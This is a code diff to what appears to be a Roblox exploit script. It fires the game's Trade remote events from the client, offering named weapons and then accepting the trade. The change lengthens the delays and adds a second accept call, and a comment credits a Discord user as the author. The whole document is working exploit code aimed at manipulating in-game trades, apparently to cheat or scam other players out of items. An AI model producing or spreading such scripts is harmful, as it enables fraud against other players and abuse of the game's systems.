@@ -124,6 +124,7 @@ game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer("BattleAxe2","We
 
 game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer("Bioblade","Weapons")
 -- Script is made by Time?#0001 (Maybe will be working discord
-wait(8)
+wait(10)
 game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
-wait(1)
+wait(2)
+game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
